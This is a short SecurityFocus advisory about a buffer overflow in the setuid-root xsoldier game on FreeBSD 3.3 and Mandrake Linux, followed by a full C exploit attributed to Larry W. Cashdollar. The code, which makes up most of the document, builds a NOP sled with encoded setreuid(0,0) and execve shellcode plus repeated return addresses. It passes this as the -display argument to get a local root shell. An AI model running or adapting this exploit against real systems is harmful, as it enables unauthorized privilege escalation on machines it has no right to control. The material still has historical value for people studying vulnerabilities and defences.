source: http://www.securityfocus.com/bid/871/info
 
Certain versions of FreeBSD (3.3 Confirmed) and Linux (Mandrake confirmed) ship with a vulnerable binary in their X11 games package. The binary/game in question, xsoldier, is a setuid root binary meant to be run via an X windows console.
 
The binary itself is subject to a buffer overflow attack (which may be launched from the command line) which can be launched to gain root privileges. The overflow itself is in the code written to handle the -display option and is possible to overflow by a user-supplied long string.
 
The user does not have to have a valid $DISPLAY to exploit this.

/*Larry W. Cashdollar linux xsolider exploit.
 *lwc@vapid.dhs.org http://vapid.dhs.org
 *if xsolider is built and installed from its source it will be installed
 *setuid root in /usr/local/games 
 *original exploit found by brock tellier for freebsd 3.3 ports packages.
 *If a setregid() call is placed in the shellcode, you can get egid=12
 *with the default mandrake installation.*/


#include <stdio.h>
#include <stdlib.h>

#define NOP 0x90		/*no operation skip to next instruction. */
#define LEN 4480			/*our buffersize. */


char shellcode[] =		/*execve with setreuid(0,0) and no '/' hellkit v1.1 */
  "\xeb\x03\x5e\xeb\x05\xe8\xf8\xff\xff\xff\x83\xc6\x0d\x31\xc9\xb1\x6c\x80\x36\x01\x46\xe2\xfa"
  "\xea\x09\x2e\x63\x68\x6f\x2e\x72\x69\x01\x80\xed\x66\x2a\x01\x01"
  "\x54\x88\xe4\x82\xed\x1d\x56\x57\x52\xe9\x01\x01\x01\x01\x5a\x80\xc2\xc7\x11"
  "\x01\x01\x8c\xba\x1f\xee\xfe\xfe\xc6\x44\xfd\x01\x01\x01\x01\x88\x7c\xf9\xb9"
  "\x47\x01\x01\x01\x30\xf7\x30\xc8\x52\x88\xf2\xcc\x81\x8c\x4c\xf9\xb9\x0a\x01"
  "\x01\x01\x88\xff\x30\xd3\x52\x88\xf2\xcc\x81\x30\xc1\x5a\x5f\x5e\x88\xed\x5c"
  "\xc2\x91";


/*Nab the stack pointer to use as an index into our nop's*/
long
get_sp ()
{
  __asm__ ("mov %esp, %eax");
}

int
main (int argc, char *argv[])
{
  char buffer[LEN];
  int i, offset;
  long retaddr = get_sp ();

  if (argc <= 1)
    offset = 0;
  else
    offset = atoi (argv[1]);

/*#Copy the NOPs  in to the buffer leaving space for shellcode and
  #pointers*/

  for (i = 0; i < (LEN - strlen (shellcode) - 100); i++)
    *(buffer + i) = NOP;

/*[NNNNNNNNNNNNNNNNNNNNN                            ]*/
/*                      ^-- LEN -(strlen(shellcode)) - 35*/
/*#Copy the shell code into the buffer*/

  memcpy (buffer + i, shellcode, strlen (shellcode));

/*[NNNNNNNNNNNNNNNNNNNNNSSSSSSSSSSSSSSSS            ]*/
/*                      ^-(buffer+i)                 */
/*#Fill the buffer with our new address to jump to esp + offset */

  for (i = i + strlen (shellcode); i < LEN; i += 4)
    *(long *) &buffer[i] = retaddr+offset;

/*[NNNNNNNNNNNNNNNNNNNNNSSSSSSSSSSSSSSSSRRRRRRRRRRRRR]*/
/*                                      ^-(i+strlen(shellcode))*/

  printf ("Jumping to address %x BufSize %d\n", retaddr + offset, LEN);
  execl ("/usr/local/games/xsoldier", "xsoldier", "-display", buffer, 0);

}